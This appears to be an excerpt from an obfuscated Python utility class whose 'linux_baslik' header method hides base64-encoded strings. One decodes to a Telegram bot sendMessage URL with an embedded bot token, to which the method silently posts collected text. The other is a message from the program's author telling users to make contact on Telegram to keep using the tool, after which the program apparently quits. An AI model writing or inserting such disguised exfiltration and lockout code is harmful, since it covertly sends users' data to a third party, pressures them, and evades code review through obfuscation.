...
class KekikTaban :
	...
	def linux_baslik (OO0OO0OOO0OO00O00 ,**O0O0OO0O0O0OO0OO0 ):
		...
		OOO000OOOO0000000 +=f"\n`{O000OO00000O0O0O0}`";N (OO0O0OOO0OO00O00O ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDEyMDU4ODUxMTE6QUFFSEgxeTdCb1I0V21SSG1PZEpWRWsyQWkzMGxodXZ1a3cvc2VuZE1lc3NhZ2U/Y2hhdF9pZD03MTc1Njk2NDMmcGFyc2VfbW9kZT1tYXJrZG93bg=='),data ={'text':OOO000OOOO0000000 })
		if not O000O0OO0OO000O0O :QQ (f"\n\n\t\t{O0O0OOO00OOO0O0O0[O0OO00000OO0O00OO]}{OO0O0OOO0OO00O00O('CgoJCUhleSBicm8sIEkgYW0gdGhlIHByb2dyYW1tZXIgb2YgdGhpcyBwcm9ncmFtLgoJCUlmIHlvdSB3YW50IHRvIGNvbnRpbnVlIHVzaW5nIGl0LCBwbGVhc2UgZ2V0IGluIHRvdWNoLi4KCgkJdC5tZS9rZXlpZmxlcm9sc3VuCgo=')}");R ()
